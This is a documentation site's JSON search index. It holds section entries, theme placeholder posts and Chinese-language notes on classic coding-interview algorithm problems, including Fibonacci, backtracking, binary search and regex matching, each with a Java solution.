[{"id":0,"href":"/cs-basics/algorithms/","title":"algorithms","parent":"cs-basics","content":""},{"id":1,"href":"/system-design/distributed-system/api-gateway/","title":"api-gateway","parent":"distributed-system","content":""},{"id":2,"href":"/system-design/authority-certification/","title":"authority-certification","parent":"system-design","content":""},{"id":3,"href":"/java/basis/","title":"basis","parent":"java","content":""},{"id":4,"href":"/system-design/coding-way/","title":"coding-way","parent":"system-design","content":""},{"id":5,"href":"/java/collection/","title":"collection","parent":"java","content":""},{"id":6,"href":"/cs-basics/","title":"cs-basics","parent":"Welcome to the documentation","content":""},{"id":7,"href":"/cs-basics/data-structure/","title":"data-structure","parent":"cs-basics","content":""},{"id":8,"href":"/database/","title":"database","parent":"Welcome to the documentation","content":""},{"id":9,"href":"/system-design/distributed/","title":"distributed","parent":"system-design","content":""},{"id":10,"href":"/system-design/distributed-system/","title":"distributed-system","parent":"system-design","content":""},{"id":11,"href":"/system-design/framework/","title":"framework","parent":"system-design","content":""},{"id":12,"href":"/system-design/high-availability/","title":"high-availability","parent":"system-design","content":""},{"id":13,"href":"/java/","title":"java","parent":"Welcome to the documentation","content":""},{"id":14,"href":"/java/jvm/","title":"jvm","parent":"java","content":""},{"id":15,"href":"/%E7%AC%94%E8%AE%B0/Leetcode%E9%A2%98%E8%A7%A3/","title":"Leetcode题解","parent":"笔记","content":""},{"id":16,"href":"/java/tips/locate-performance-problems/","title":"locate-performance-problems","parent":"tips","content":""},{"id":17,"href":"/system-design/distributed-system/message-queue/","title":"message-queue","parent":"distributed-system","content":""},{"id":18,"href":"/system-design/micro-service/","title":"micro-service","parent":"system-design","content":""},{"id":19,"href":"/java/multi-thread/","title":"multi-thread","parent":"java","content":""},{"id":20,"href":"/system-design/framework/mybatis/","title":"mybatis","parent":"framework","content":""},{"id":21,"href":"/database/mysql/","title":"mysql","parent":"database","content":""},{"id":22,"href":"/cs-basics/network/","title":"network","parent":"cs-basics","content":""},{"id":23,"href":"/java/new-features/","title":"new-features","parent":"java","content":""},{"id":24,"href":"/cs-basics/operating-system/","title":"operating-system","parent":"cs-basics","content":""},{"id":25,"href":"/questions/","title":"questions","parent":"Welcome to the documentation","content":""},{"id":26,"href":"/database/Redis/","title":"Redis","parent":"database","content":""},{"id":27,"href":"/system-design/distributed-system/rpc/","title":"rpc","parent":"distributed-system","content":""},{"id":28,"href":"/system-design/framework/spring/","title":"spring","parent":"framework","content":""},{"id":29,"href":"/system-design/","title":"system-design","parent":"Welcome to the documentation","content":""},{"id":30,"href":"/java/tips/","title":"tips","parent":"java","content":""},{"id":31,"href":"/tools/","title":"tools","parent":"Welcome to the documentation","content":""},{"id":32,"href":"/system-design/website-architecture/","title":"website-architecture","parent":"system-design","content":""},{"id":33,"href":"/system-design/distributed-system/zookeeper/","title":"zookeeper","parent":"distributed-system","content":""},{"id":34,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/","title":"分布式系统","parent":"Welcome to the documentation","content":""},{"id":35,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/","title":"大数据","parent":"Welcome to the documentation","content":""},{"id":36,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/","title":"微软服务","parent":"Welcome to the documentation","content":""},{"id":37,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"数据结构","parent":"笔记","content":""},{"id":38,"href":"/%E7%AC%94%E8%AE%B0/","title":"笔记","parent":"Welcome to the documentation","content":""},{"id":39,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/","title":"算法","parent":"笔记","content":""},{"id":40,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","title":"设计模式","parent":"笔记","content":""},{"id":41,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/","title":"高可用","parent":"Welcome to the documentation","content":""},{"id":42,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/","title":"高并发","parent":"Welcome to the documentation","content":""},{"id":43,"href":"/posts/","title":"News","parent":"Welcome to the documentation","content":""},{"id":44,"href":"/posts/initial-release/","title":"Initial release","parent":"News","content":"This is the first release of the Geekdoc theme.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo.\n"},{"id":45,"href":"/","title":"Welcome to the documentation","parent":"","content":"    \nGeekdoc is a simple Hugo theme for documentations. It is intentionally designed as a fast and lean theme and may not fit the requirements of complex projects. If a more feature-complete theme is required there are a lot of got alternatives out there.\nFeature overview  Clean and simple design  Stay focused on exploring the content and don\u0026rsquo;t get overwhelmed by a complex design.  Light and mobile-friendly  The theme is powered by less than 1 MB and looks impressive on mobile devices as well as on a regular Desktop.  Easy customization  The look and feel can be easily customized by CSS custom properties (variables), features can be adjusted by Hugo parameters.   Zero initial configuration  Getting started in minutes. The theme is shipped with a default configuration and works out of the box.  Handy shortcodes  We included some (hopefully) useful custom shortcodes so you don\u0026rsquo;t have to and can focus on writing amazing docs.  Dark mode  Powerful dark mode that detects your system preferences or can be controlled by a toggle switch.   "},{"id":46,"href":"/tags/Documentation/","title":"Documentation","parent":"Tags","content":""},{"id":47,"href":"/posts/hello_geekdoc/","title":"Hello Geekdoc","parent":"News","content":"This is the first release of the Geekdoc theme.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo.\nAmalia id per in minimum facility, quid facet modifier ea ma. Ill um select ma ad, en ferric patine sentient vim. Per expendable foreordained interpretations cu, maxim sole pertinacity in ram. Que no rota alters, ad sea sues exercise main rum, cu diam mas facility sea.\n"},{"id":48,"href":"/tags/","title":"Tags","parent":"Welcome to the documentation","content":""},{"id":49,"href":"/_includes/","title":"Includes","parent":"Welcome to the documentation","content":""},{"id":50,"href":"/_includes/include-page/","title":"Include Page","parent":"Includes","content":"Example page include\nExample Shortcode\nShortcode used in an include page.     Head 1 Head 2 Head 3     1 2 3    "},{"id":51,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/10.110.1-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/","title":"10.1 斐波那契数列","parent":"数据结构","content":"10.1 斐波那契数列    题目链接    牛客网\n题目描述    求斐波那契数列的第 n 项，n \u0026lt;= 39。\n1}\\end{array}\\right.\" class=\"mathjax-pic\"/ -- \n解题思路    如果使用递归求解，会重复计算一些子问题。例如，计算 f(4) 需要计算 f(3) 和 f(2)，计算 f(3) 需要计算 f(2) 和 f(1)，可以看到 f(2) 被重复计算了。\n\n递归是将一个问题划分成多个子问题求解，动态规划也是如此，但是动态规划会把子问题的解缓存起来，从而避免重复求解子问题。\npublic int Fibonacci(int n) { if (n \u0026lt;= 1) return n; int[] fib = new int[n + 1]; fib[1] = 1; for (int i = 2; i \u0026lt;= n; i++) fib[i] = fib[i - 1] + fib[i - 2]; return fib[n]; } 考虑到第 i 项只与第 i-1 和第 i-2 项有关，因此只需要存储前两项的值就能求解第 i 项，从而将空间复杂度由 O(N) 降低为 O(1)。\npublic int Fibonacci(int n) { if (n \u0026lt;= 1) return n; int pre2 = 0, pre1 = 1; int fib = 0; for (int i = 2; i \u0026lt;= n; i++) { fib = pre2 + pre1; pre2 = pre1; pre1 = fib; } return fib; } 由于待求解的 n 小于 40，因此可以将前 40 项的结果先进行计算，之后就能以 O(1) 时间复杂度得到第 n 项的值。\npublic class Solution { private int[] fib = new int[40]; public Solution() { fib[1] = 1; for (int i = 2; i \u0026lt; fib.length; i++) fib[i] = fib[i - 1] + fib[i - 2]; } public int Fibonacci(int n) { return fib[n]; } } "},{"id":52,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/10.210.2-%E7%9F%A9%E5%BD%A2%E8%A6%86%E7%9B%96/","title":"10.2 矩形覆盖","parent":"数据结构","content":"10.2 矩形覆盖    题目链接    牛客网\n题目描述    我们可以用 2*1 的小矩形横着或者竖着去覆盖更大的矩形。请问用 n 个 2*1 的小矩形无重叠地覆盖一个 2*n 的大矩形，总共有多少种方法？\n\n解题思路    当 n 为 1 时，只有一种覆盖方法：\n\n当 n 为 2 时，有两种覆盖方法：\n\n要覆盖 2*n 的大矩形，可以先覆盖 2*1 的矩形，再覆盖 2*(n-1) 的矩形；或者先覆盖 2*2 的矩形，再覆盖 2*(n-2) 的矩形。而覆盖 2*(n-1) 和 2*(n-2) 的矩形可以看成子问题。该问题的递推公式如下：\n1}\\end{array}\\right.\" class=\"mathjax-pic\"/ -- \npublic int rectCover(int n) { if (n \u0026lt;= 2) return n; int pre2 = 1, pre1 = 2; int result = 0; for (int i = 3; i \u0026lt;= n; i++) { result = pre2 + pre1; pre2 = pre1; pre1 = result; } return result; } "},{"id":53,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/10.310.3-%E8%B7%B3%E5%8F%B0%E9%98%B6/","title":"10.3 跳台阶","parent":"数据结构","content":"10.3 跳台阶    题目链接    牛客网\n题目描述    一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。\n\n解题思路    当 n = 1 时，只有一种跳法：\n\n当 n = 2 时，有两种跳法：\n\n跳 n 阶台阶，可以先跳 1 阶台阶，再跳 n-1 阶台阶；或者先跳 2 阶台阶，再跳 n-2 阶台阶。而 n-1 和 n-2 阶台阶的跳法可以看成子问题，该问题的递推公式为：\n\npublic int JumpFloor(int n) { if (n \u0026lt;= 2) return n; int pre2 = 1, pre1 = 2; int result = 0; for (int i = 2; i \u0026lt; n; i++) { result = pre2 + pre1; pre2 = pre1; pre1 = result; } return result; } "},{"id":54,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/10.410.4-%E5%8F%98%E6%80%81%E8%B7%B3%E5%8F%B0%E9%98%B6/","title":"10.4 变态跳台阶","parent":"数据结构","content":"10.4 变态跳台阶    题目链接    牛客网\n题目描述    一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级\u0026hellip; 它也可以跳上 n 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。\n\n解题思路    动态规划    public int jumpFloorII(int target) { int[] dp = new int[target]; Arrays.fill(dp, 1); for (int i = 1; i \u0026lt; target; i++) for (int j = 0; j \u0026lt; i; j++) dp[i] += dp[j]; return dp[target - 1]; } 数学推导    跳上 n-1 级台阶，可以从 n-2 级跳 1 级上去，也可以从 n-3 级跳 2 级上去\u0026hellip;，那么\nf(n-1) = f(n-2) + f(n-3) + ... + f(0) 同样，跳上 n 级台阶，可以从 n-1 级跳 1 级上去，也可以从 n-2 级跳 2 级上去\u0026hellip; ，那么\nf(n) = f(n-1) + f(n-2) + ... + f(0) 综上可得\nf(n) - f(n-1) = f(n-1) 即\nf(n) = 2*f(n-1) 所以 f(n) 是一个等比数列\npublic int JumpFloorII(int target) { return (int) Math.pow(2, target - 1); } "},{"id":55,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/11.11.-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/","title":"11. 旋转数组的最小数字","parent":"数据结构","content":"11. 旋转数组的最小数字    题目链接    牛客网\n题目描述    把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。\n\n解题思路    将旋转数组对半分可以得到一个包含最小元素的新旋转数组，以及一个非递减排序的数组。新的旋转数组的长度是原数组的一半，从而将问题规模减少了一半，这种折半性质的算法的时间复杂度为 O(log2N)。\n\n此时问题的关键在于确定对半分得到的两个数组哪一个是旋转数组，哪一个是非递减数组。我们很容易知道非递减数组的第一个元素一定小于等于最后一个元素。\n通过修改二分查找算法进行求解（l 代表 low，m 代表 mid，h 代表 high）：\n 当 nums[m] \u0026lt;= nums[h] 时，表示 [m, h] 区间内的数组是非递减数组，[l, m] 区间内的数组是旋转数组，此时令 h = m； 否则 [m + 1, h] 区间内的数组是旋转数组，令 l = m + 1。  public int minNumberInRotateArray(int[] nums) { if (nums.length == 0) return 0; int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int m = l + (h - l) / 2; if (nums[m] \u0026lt;= nums[h]) h = m; else l = m + 1; } return nums[l]; } 如果数组元素允许重复，会出现一个特殊的情况：nums[l] == nums[m] == nums[h]，此时无法确定解在哪个区间，需要切换到顺序查找。例如对于数组 {1,1,1,0,1}，l、m 和 h 指向的数都为 1，此时无法知道最小数字 0 在哪个区间。\npublic int minNumberInRotateArray(int[] nums) { if (nums.length == 0) return 0; int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int m = l + (h - l) / 2; if (nums[l] == nums[m] \u0026amp;\u0026amp; nums[m] == nums[h]) return minNumber(nums, l, h); else if (nums[m] \u0026lt;= nums[h]) h = m; else l = m + 1; } return nums[l]; } private int minNumber(int[] nums, int l, int h) { for (int i = l; i \u0026lt; h; i++) if (nums[i] \u0026gt; nums[i + 1]) return nums[i + 1]; return nums[l]; } "},{"id":56,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/12.12.-%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/","title":"12. 矩阵中的路径","parent":"数据结构","content":"12. 矩阵中的路径    牛客网\n题目描述    判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向上下左右移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。\n例如下面的矩阵包含了一条 bfce 路径。\n\n解题思路    使用回溯法（backtracking）进行求解，它是一种暴力搜索方法，通过搜索所有可能的结果来求解问题。回溯法在一次搜索结束时需要进行回溯（回退），将这一次搜索过程中设置的状态进行清除，从而开始一次新的搜索过程。例如下图示例中，从 f 开始，下一步有 4 种搜索可能，如果先搜索 b，需要将 b 标记为已经使用，防止重复使用。在这一次搜索结束之后，需要将 b 的已经使用状态清除，并搜索 c。\n\n本题的输入是数组而不是矩阵（二维数组），因此需要先将数组转换成矩阵。\npublic class Solution { private final static int[][] next = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}}; private int rows; private int cols; public boolean hasPath (String val, int rows, int cols, String path) { if (rows == 0 || cols == 0) return false; this.rows = rows; this.cols = cols; char[] array = val.toCharArray(); char[][] matrix = buildMatrix(array); char[] pathList = path.toCharArray(); boolean[][] marked = new boolean[rows][cols]; for (int i = 0; i \u0026lt; rows; i++) for (int j = 0; j \u0026lt; cols; j++) if (backtracking(matrix, pathList, marked, 0, i, j)) return true; return false; } private boolean backtracking(char[][] matrix, char[] pathList, boolean[][] marked, int pathLen, int r, int c) { if (pathLen == pathList.length) return true; if (r \u0026lt; 0 || r \u0026gt;= rows || c \u0026lt; 0 || c \u0026gt;= cols || matrix[r][c] != pathList[pathLen] || marked[r][c]) { return false; } marked[r][c] = true; for (int[] n : next) if (backtracking(matrix, pathList, marked, pathLen + 1, r + n[0], c + n[1])) return true; marked[r][c] = false; return false; } private char[][] buildMatrix(char[] array) { char[][] matrix = new char[rows][cols]; for (int r = 0, idx = 0; r \u0026lt; rows; r++) for (int c = 0; c \u0026lt; cols; c++) matrix[r][c] = array[idx++]; return matrix; } public static void main(String[] args) { Solution solution = new Solution(); String val = \u0026#34;ABCESFCSADEE\u0026#34;; int rows = 3; int cols = 4; String path = \u0026#34;ABCCED\u0026#34;; boolean res = solution.hasPath(val, rows, cols, path); System.out.println(res); } } "},{"id":57,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/13.13.-%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/","title":"13. 机器人的运动范围","parent":"数据结构","content":"13. 机器人的运动范围    牛客网\n题目描述    地上有一个 m 行和 n 列的方格。一个机器人从坐标 (0, 0) 的格子开始移动，每一次只能向左右上下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于 k 的格子。\n例如，当 k 为 18 时，机器人能够进入方格 (35,37)，因为 3+5+3+7=18。但是，它不能进入方格 (35,38)，因为 3+5+3+8=19。请问该机器人能够达到多少个格子？\n解题思路    使用深度优先搜索（Depth First Search，DFS）方法进行求解。回溯是深度优先搜索的一种特例，它在一次搜索过程中需要设置一些本次搜索过程的局部状态，并在本次搜索结束之后清除状态。而普通的深度优先搜索并不需要使用这些局部状态，虽然还是有可能设置一些全局状态。\nprivate static final int[][] next = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}}; private int cnt = 0; private int rows; private int cols; private int threshold; private int[][] digitSum; public int movingCount(int threshold, int rows, int cols) { this.rows = rows; this.cols = cols; this.threshold = threshold; initDigitSum(); boolean[][] marked = new boolean[rows][cols]; dfs(marked, 0, 0); return cnt; } private void dfs(boolean[][] marked, int r, int c) { if (r \u0026lt; 0 || r \u0026gt;= rows || c \u0026lt; 0 || c \u0026gt;= cols || marked[r][c]) return; marked[r][c] = true; if (this.digitSum[r][c] \u0026gt; this.threshold) return; cnt++; for (int[] n : next) dfs(marked, r + n[0], c + n[1]); } private void initDigitSum() { int[] digitSumOne = new int[Math.max(rows, cols)]; for (int i = 0; i \u0026lt; digitSumOne.length; i++) { int n = i; while (n \u0026gt; 0) { digitSumOne[i] += n % 10; n /= 10; } } this.digitSum = new int[rows][cols]; for (int i = 0; i \u0026lt; this.rows; i++) for (int j = 0; j \u0026lt; this.cols; j++) this.digitSum[i][j] = digitSumOne[i] + digitSumOne[j]; } "},{"id":58,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/14.14.-%E5%89%AA%E7%BB%B3%E5%AD%90/","title":"14. 剪绳子","parent":"数据结构","content":"14. 剪绳子    题目链接    牛客网\n题目描述    把一根绳子剪成多段，并且使得每段的长度乘积最大。\nn = 2 return 1 (2 = 1 + 1) n = 10 return 36 (10 = 3 + 3 + 4) 解题思路    贪心    尽可能得多剪长度为 3 的绳子，并且不允许有长度为 1 的绳子出现。如果出现了，就从已经切好长度为 3 的绳子中拿出一段与长度为 1 的绳子重新组合，把它们切成两段长度为 2 的绳子。以下为证明过程。\n将绳子拆成 1 和 n-1，则 1(n-1)-n=-1\u0026lt;0，即拆开后的乘积一定更小，所以不能出现长度为 1 的绳子。\n将绳子拆成 2 和 n-2，则 2(n-2)-n = n-4，在 n\u0026gt;=4 时这样拆开能得到的乘积会比不拆更大。\n将绳子拆成 3 和 n-3，则 3(n-3)-n = 2n-9，在 n\u0026gt;=5 时效果更好。\n将绳子拆成 4 和 n-4，因为 4=2*2，因此效果和拆成 2 一样。\n将绳子拆成 5 和 n-5，因为 5=2+3，而 5\u0026lt;2*3，所以不能出现 5 的绳子，而是尽可能拆成 2 和 3。\n将绳子拆成 6 和 n-6，因为 6=3+3，而 6\u0026lt;3*3，所以不能出现 6 的绳子，而是拆成 3 和 3。这里 6 同样可以拆成 6=2+2+2，但是 3(n - 3) - 2(n - 2) = n - 5 \u0026gt;= 0，在 n\u0026gt;=5 的情况下将绳子拆成 3 比拆成 2 效果更好。\n继续拆成更大的绳子可以发现都比拆成 2 和 3 的效果更差，因此我们只考虑将绳子拆成 2 和 3，并且优先拆成 3，当拆到绳子长度 n 等于 4 时，也就是出现 3+1，此时只能拆成 2+2。\npublic int cutRope(int n) { if (n \u0026lt; 2) return 0; if (n == 2) return 1; if (n == 3) return 2; int timesOf3 = n / 3; if (n - timesOf3 * 3 == 1) timesOf3--; int timesOf2 = (n - timesOf3 * 3) / 2; return (int) (Math.pow(3, timesOf3)) * (int) (Math.pow(2, timesOf2)); } 动态规划    public int cutRope(int n) { int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i \u0026lt;= n; i++) for (int j = 1; j \u0026lt; i; j++) dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j))); return dp[n]; } "},{"id":59,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/15.15.-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD-1-%E7%9A%84%E4%B8%AA%E6%95%B0/","title":"15. 二进制中 1 的个数","parent":"数据结构","content":"15. 二进制中 1 的个数    题目链接    牛客网\n题目描述    输入一个整数，输出该数二进制表示中 1 的个数。\n解题思路    n\u0026amp;(n-1) 位运算可以将 n 的位级表示中最低的那一位 1 设置为 0。不断将 1 设置为 0，直到 n 为 0。时间复杂度：O(M)，其中 M 表示 1 的个数。\n\npublic int NumberOf1(int n) { int cnt = 0; while (n != 0) { cnt++; n \u0026amp;= (n - 1); } return cnt; } "},{"id":60,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/16.16.-%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/","title":"16. 数值的整数次方","parent":"数据结构","content":"16. 数值的整数次方    题目链接    牛客网\n题目描述    给定一个 double 类型的浮点数 x和 int 类型的整数 n，求 x 的 n 次方。\n解题思路     -- 最直观的解法是将 x 重复乘 n 次，x*x*x\u0026hellip;*x，那么时间复杂度为 O(N)。因为乘法是可交换的，所以可以将上述操作拆开成两半 (x*x..*x)* (x*x..*x)，两半的计算是一样的，因此只需要计算一次。而且对于新拆开的计算，又可以继续拆开。这就是分治思想，将原问题的规模拆成多个规模较小的子问题，最后子问题的解合并起来。\n本题中子问题是 xn/2，在将子问题合并时将子问题的解乘于自身相乘即可。但如果 n 不为偶数，那么拆成两半还会剩下一个 x，在将子问题合并时还需要需要多乘于一个 x。\n\n因为 (x*x)n/2 可以通过递归求解，并且每次递归 n 都减小一半，因此整个算法的时间复杂度为 O(logN)。\npublic double Power(double x, int n) { boolean isNegative = false; if (n \u0026lt; 0) { n = -n; isNegative = true; } double res = pow(x, n); return isNegative ? 1 / res : res; } private double pow(double x, int n) { if (n == 0) return 1; if (n == 1) return x; double res = pow(x, n / 2); res = res * res; if (n % 2 != 0) res *= x; return res; } "},{"id":61,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/17.17.-%E6%89%93%E5%8D%B0%E4%BB%8E-1-%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84-n-%E4%BD%8D%E6%95%B0/","title":"17. 打印从 1 到最大的 n 位数","parent":"数据结构","content":"17. 打印从 1 到最大的 n 位数    题目描述    输入数字 n，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数即 999。\n解题思路    由于 n 可能会非常大，因此不能直接用 int 表示数字，而是用 char 数组进行存储。\n使用回溯法得到所有的数。\npublic void print1ToMaxOfNDigits(int n) { if (n \u0026lt;= 0) return; char[] number = new char[n]; print1ToMaxOfNDigits(number, 0); } private void print1ToMaxOfNDigits(char[] number, int digit) { if (digit == number.length) { printNumber(number); return; } for (int i = 0; i \u0026lt; 10; i++) { number[digit] = (char) (i + \u0026#39;0\u0026#39;); print1ToMaxOfNDigits(number, digit + 1); } } private void printNumber(char[] number) { int index = 0; while (index \u0026lt; number.length \u0026amp;\u0026amp; number[index] == \u0026#39;0\u0026#39;) index++; while (index \u0026lt; number.length) System.out.print(number[index++]); System.out.println(); } "},{"id":62,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/18.118.1-%E5%9C%A8-O1-%E6%97%B6%E9%97%B4%E5%86%85%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E8%8A%82%E7%82%B9/","title":"18.1 在 O(1) 时间内删除链表节点","parent":"数据结构","content":"18.1 在 O(1) 时间内删除链表节点    解题思路    ① 如果该节点不是尾节点，那么可以直接将下一个节点的值赋给该节点，然后令该节点指向下下个节点，再删除下一个节点，时间复杂度为 O(1)。\n\n② 否则，就需要先遍历链表，找到节点的前一个节点，然后让前一个节点指向 null，时间复杂度为 O(N)。\n\n综上，如果进行 N 次操作，那么大约需要操作节点的次数为 N-1+N=2N-1，其中 N-1 表示 N-1 个不是尾节点的每个节点以 O(1) 的时间复杂度操作节点的总次数，N 表示 1 个尾节点以 O(N) 的时间复杂度操作节点的总次数。(2N-1)/N ~ 2，因此该算法的平均时间复杂度为 O(1)。\npublic ListNode deleteNode(ListNode head, ListNode tobeDelete) { if (head == null || tobeDelete == null) return null; if (tobeDelete.next != null) { // 要删除的节点不是尾节点  ListNode next = tobeDelete.next; tobeDelete.val = next.val; tobeDelete.next = next.next; } else { if (head == tobeDelete) // 只有一个节点  head = null; else { ListNode cur = head; while (cur.next != tobeDelete) cur = cur.next; cur.next = null; } } return head; } "},{"id":63,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/18.218.2-%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E7%BB%93%E7%82%B9/","title":"18.2 删除链表中重复的结点","parent":"数据结构","content":"18.2 删除链表中重复的结点    牛客网\n题目描述    \n解题描述    public ListNode deleteDuplication(ListNode pHead) { if (pHead == null || pHead.next == null) return pHead; ListNode next = pHead.next; if (pHead.val == next.val) { while (next != null \u0026amp;\u0026amp; pHead.val == next.val) next = next.next; return deleteDuplication(next); } else { pHead.next = deleteDuplication(pHead.next); return pHead; } } "},{"id":64,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/19.19.-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/","title":"19. 正则表达式匹配","parent":"数据结构","content":"19. 正则表达式匹配    牛客网\n题目描述    请实现一个函数用来匹配包括 \u0026lsquo;.\u0026rsquo; 和 \u0026lsquo;*\u0026rsquo; 的正则表达式。模式中的字符 \u0026lsquo;.\u0026rsquo; 表示任意一个字符，而 \u0026lsquo;*\u0026rsquo; 表示它前面的字符可以出现任意次（包含 0 次）。\n在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串 \u0026ldquo;aaa\u0026rdquo; 与模式 \u0026ldquo;a.a\u0026rdquo; 和 \u0026ldquo;ab*ac*a\u0026rdquo; 匹配，但是与 \u0026ldquo;aa.a\u0026rdquo; 和 \u0026ldquo;ab*a\u0026rdquo; 均不匹配。\n解题思路    应该注意到，'.' 是用来当做一个任意字符，而 \u0026lsquo;*\u0026rsquo; 是用来重复前面的字符。这两个的作用不同，不能把 \u0026lsquo;.\u0026rsquo; 的作用和 \u0026lsquo;*\u0026rsquo; 进行类比，从而把它当成重复前面字符一次。\npublic boolean match(String str, String pattern) { int m = str.length(), n = pattern.length(); boolean[][] dp = new boolean[m + 1][n + 1]; dp[0][0] = true; for (int i = 1; i \u0026lt;= n; i++) if (pattern.charAt(i - 1) == \u0026#39;*\u0026#39;) dp[0][i] = dp[0][i - 2]; for (int i = 1; i \u0026lt;= m; i++) for (int j = 1; j \u0026lt;= n; j++) if (str.charAt(i - 1) == pattern.charAt(j - 1) || pattern.charAt(j - 1) == \u0026#39;.\u0026#39;) dp[i][j] = dp[i - 1][j - 1]; else if (pattern.charAt(j - 1) == \u0026#39;*\u0026#39;) if (pattern.charAt(j - 2) == str.charAt(i - 1) || pattern.charAt(j - 2) == \u0026#39;.\u0026#39;) { dp[i][j] |= dp[i][j - 1]; // a* counts as single a  dp[i][j] |= dp[i - 1][j]; // a* counts as multiple a  dp[i][j] |= dp[i][j - 2]; // a* counts as empty  } else dp[i][j] = dp[i][j - 2]; // a* only counts as empty  return dp[m][n]; } "},{"id":65,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/20.20.-%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"20. 表示数值的字符串","parent":"数据结构","content":"20. 表示数值的字符串    牛客网\n题目描述    true \u0026quot;+100\u0026quot; \u0026quot;5e2\u0026quot; \u0026quot;-123\u0026quot; \u0026quot;3.1416\u0026quot; \u0026quot;-1E-16\u0026quot; false \u0026quot;12e\u0026quot; \u0026quot;1a3.14\u0026quot; \u0026quot;1.2.3\u0026quot; \u0026quot;+-5\u0026quot; \u0026quot;12e+4.3\u0026quot; 解题思路    使用正则表达式进行匹配。\n[] ： 字符集合 () ： 分组 ? ： 重复 0 ~ 1 次 + ： 重复 1 ~ n 次 * ： 重复 0 ~ n 次 . ： 任意字符 \\\\. ： 转义后的 . \\\\d ： 数字 public boolean isNumeric (String str) { if (str == null || str.length() == 0) return false; return new String(str).matches(\u0026#34;[+-]?\\\\d*(\\\\.\\\\d+)?([eE][+-]?\\\\d+)?\u0026#34;); } 